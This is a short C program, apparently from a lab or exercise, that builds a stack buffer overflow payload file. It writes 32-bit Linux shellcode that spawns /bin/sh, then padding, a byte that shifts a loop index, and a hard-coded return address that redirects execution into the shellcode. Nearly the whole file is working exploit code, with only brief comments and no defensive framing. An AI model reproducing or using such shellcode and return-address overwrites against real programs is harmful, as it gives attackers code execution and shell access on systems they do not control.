#include <stdio.h>

/* Note that i (Loukas Mertzanis) am NOT the author of the openTerm code */
/* Author:	Jean Pascal Pereira <pereira@secbiz.de> */

int main(){
	int i;
	FILE *fp;
	/* execvp με argument το bin/sh */
char openTerminal[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";
	fp = fopen("openShell", "w+");
    	fprintf(fp,"%s",openTerminal);
	
	for(i = 0; i < 18; i++) 
		putc('\0',fp);
	
	putc('\0',fp);
	putc('\0',fp); /*48 bytes of stack frame*/

    putc(56,fp); /* i = 56; //This way we can skip some memory bytes*/
	
    putc(0xe0,fp); /*overwrite return address to execute shellcode contained in buffer*/
    putc(0x65,fp);
    putc(0x0d,fp);
    putc(0x08,fp);
	
        putc(0xe0,fp); /*Don't mess up Name address (function's argument) */
        putc(0x65,fp);
        putc(0x0d,fp);
        putc(0x08,fp);
	return 0;
}